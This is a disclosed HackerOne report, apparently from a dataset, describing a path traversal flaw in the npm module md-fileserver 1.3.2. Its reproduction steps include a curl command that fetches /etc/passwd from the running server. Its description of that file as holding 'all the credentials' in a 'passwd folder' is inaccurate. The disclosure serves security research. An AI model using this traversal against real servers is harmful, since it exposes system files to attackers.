---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '509697'
original_report_id: '509697'
title: '[md-fileserver] Path Traversal'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2019-03-14T15:06:55.721Z'
disclosed_at: '2020-01-29T16:25:58.740Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- path-traversal
---

# [md-fileserver] Path Traversal

## Metadata

- HackerOne Report ID: 509697
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2020-01-29T16:25:58.740Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report path traversal in md-fileserver modulee
It allows an attacker to read system files via path traversal through commandline


# Module

**module name:** md-fileserver
**version:** 1.3.2
**npm page:** `https://www.npmjs.com/package/md-fileserver`

## Module Description
Starts a local server to render "markdown" files within your browser:

# Vulnerability

## Vulnerability Description
Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:
1.npm install -g md-fileserver

2.start the local server by typing below on commandline
$mdstart

3.now on terminal type
curl -v --path-as-is http://127.0.0.1:8080/etc/passwd

it will list all the credentials in passwd folder

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION] kali linux
- [NODEJS VERSION] 11.8.0
- [NPM VERSION] 6.5.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
